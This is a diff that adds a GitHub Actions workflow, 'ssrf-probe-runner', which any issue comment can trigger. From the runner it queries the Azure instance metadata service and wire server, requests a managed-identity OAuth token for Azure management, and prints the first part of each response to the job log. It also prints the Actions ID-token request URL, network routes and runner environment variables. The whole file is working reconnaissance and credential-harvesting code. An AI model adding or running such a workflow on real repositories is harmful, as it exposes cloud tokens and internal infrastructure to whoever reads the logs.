@@ -1,0 +1,33 @@
+name: ssrf-probe-runner
+on:
+  issue_comment:
+    types: [created]
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Probe internal endpoints from runner
+        run: |
+          echo "=== Azure IMDS ==="
+          curl -s --max-time 3 -H "Metadata: true" \
+            "http://169.254.169.254/metadata/instance?api-version=2021-02-01" \
+            | head -c 500 || echo "BLOCKED/TIMEOUT"
+
+          echo "=== Azure IMDS token ==="
+          curl -s --max-time 3 -H "Metadata: true" \
+            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
+            | head -c 300 || echo "BLOCKED/TIMEOUT"
+
+          echo "=== Azure wire server ==="
+          curl -s --max-time 3 "http://168.63.129.16/" | head -c 200 || echo "BLOCKED/TIMEOUT"
+
+          echo "=== Actions token URL ==="
+          echo "ACTIONS_ID_TOKEN_REQUEST_URL=$ACTIONS_ID_TOKEN_REQUEST_URL"
+          echo "ACTIONS_ID_TOKEN_REQUEST_TOKEN present=$([ -n "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" ] && echo YES || echo NO)"
+
+          echo "=== Internal network routes ==="
+          ip route show || true
+
+          echo "=== Runner env (redacted) ==="
+          env | grep -E "^(GITHUB_|RUNNER_|ACTIONS_)" | grep -v TOKEN | sort
